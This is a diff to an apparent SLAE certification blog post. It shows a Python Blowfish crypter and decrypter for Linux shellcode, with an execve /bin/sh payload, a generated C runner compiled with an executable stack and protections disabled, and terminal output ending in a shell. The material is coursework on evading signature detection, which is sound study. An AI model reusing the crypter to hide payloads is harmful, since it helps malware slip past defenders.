@@ -19,4 +19,133 @@ The last assignment from the seven requires the creation of a Custom Encrypter, 
 
 #### Theory
 
-During the length of this post, the crypter used will be Blowfish. Moreover, the language employed will be Python, with the use of the library [pycrypto](https://pypi.org/project/pycrypto/)
+During the length of this post, the crypter used will be [Blowfish](https://en.wikipedia.org/wiki/Blowfish_(cipher)). Moreover, the language employed will be Python, with the use of the library [pycrypto](https://pypi.org/project/pycrypto/)
+
+##### Encrypter
+
+```term
+# Author: SLAE-27812 (Felipe Winsnes)
+
+from Crypto.Cipher import Blowfish
+import sys
+
+if len(sys.argv) != 3:
+
+   print "[*] Example: echo -ne <shellcode between quotes> | python encrypt.py <key> <IV number>" + "\r\n"
+   sys.exit(1)
+
+obj = Blowfish.new(sys.argv[1], Blowfish.MODE_CBC, sys.argv[2])
+
+message = sys.stdin.read()
+
+ciphertext = obj.encrypt(message)
+
+crypted = ""
+
+for x in bytearray(ciphertext):
+  crypted += '\\x'
+  ciphertext = '%02x' % x
+  crypted += ciphertext
+
+print '"' + crypted + '"'
+```
+
+As you can see, the shellcode must be printed and piped as an argument. Furthermore, the key and the IV must be parsed as arguments as well. In addition, the IV number should be 
+specifically 8, as IV takes an 8 byte binary argument in such cryption schema.
+
+Let's encode some execve shellcode that executes /bin/sh. The key will be '@-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ' and the IV 'ZYf3J4hM'
+
+```term
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python encrypt.py 
+[*] Example: echo -ne <shellcode between quotes> | python encrypt.py <key> <IV number>
+
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ 
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ echo -ne "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80\x90\x90" | python encrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM 
+"\x24\x5c\xc5\x8c\x39\x23\x01\x95\xfd\x4c\x76\x81\x92\xb4\x97\x18\x94\xb7\xf1\x4e\x7e\xb2\xd3\x42"
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$
+```
+
+##### Decrypter
+
+```term
+# Author: SLAE-27812 (Felipe Winsnes)
+
+from Crypto.Cipher import Blowfish
+import sys, os
+
+if len(sys.argv) != 3:
+
+   print "[*] Example: python decrypt.py <key> <IV number>" + "\r\n"
+   sys.exit(1)
+
+decrypted = ""
+
+ciphertext = ("\x24\x5c\xc5\x8c\x39\x23\x01\x95\xfd\x4c\x76\x81\x92\xb4\x97\x18\x94\xb7\xf1\x4e\x7e\xb2\xd3\x42")
+
+obj = Blowfish.new(sys.argv[1], Blowfish.MODE_CBC, sys.argv[2])
+
+decrypt = obj.decrypt(ciphertext)
+shellcode = decrypt
+
+print "Original shellcode in hex escape sequence:"
+
+for x in bytearray(decrypt):
+
+  decrypted += '\\x'
+  decrypt = '%02x' % x
+  decrypted += decrypt
+
+print '"' + (decrypted) + '"'
+
+shellcode = '"' + (decrypted) + '"'
+
+template = (
+
+"#include <stdio.h>" + "\r\n"
+"#include <string.h>" + "\r\n"
+
+"unsigned char code[] = \\" + '\r\n'
++ shellcode + ";" + "\r\n" + "\r\n"
+
+"main()" + "\r\n"
+"{" + "\r\n"
+
+  'printf("\\n");' + "\r\n"
+
+        "int (*ret)() = (int(*)())code;" + "\r\n"
+
+        "ret();" + "\r\n"
+
+"}"
+
+)
+
+f = open ("test.c", "w")
+f.write(template)
+f.close()
+
+os.system("/usr/bin/gcc ./test.c -o test -fno-stack-protector -z execstack -Wall -Wno-implicit && /bin/rm ./test.c && ./test")
+os.system("/bin/rm ./test")
+```
+
+This is where things get tricky. Executing shellcode with Python is quite complex, and without WINE or ctypes it becomes quite hard. Therefore, I have chosen to generate a file that executes the shellcode and deletes the remaining files.
+
+```term
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python decrypt.py 
+[*] Example: python decrypt.py <key> <IV number>
+
+whitecr0wz@SLAE:~/assembly/assignments/Assignment_7$ python decrypt.py @-YEYCoy#86s+qXIngZwHe8X8tl4-59ADmJQ ZYf3J4hM
+Original shellcode in hex escape sequence:
+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\xb0\x0b\xcd\x80\x90\x90"
+
+$
+```
+
+### Code
+
+This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: [http://securitytube-training.com/online-
+courses/securitytube-linux-assembly-expert/](http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/)
+
+Student ID: SLAE-27812/PA-27812
+
+You can find all of the used resources within this post [here](https://github.com/whitecr0wz/SLAE/tree/main/Assignment_7).
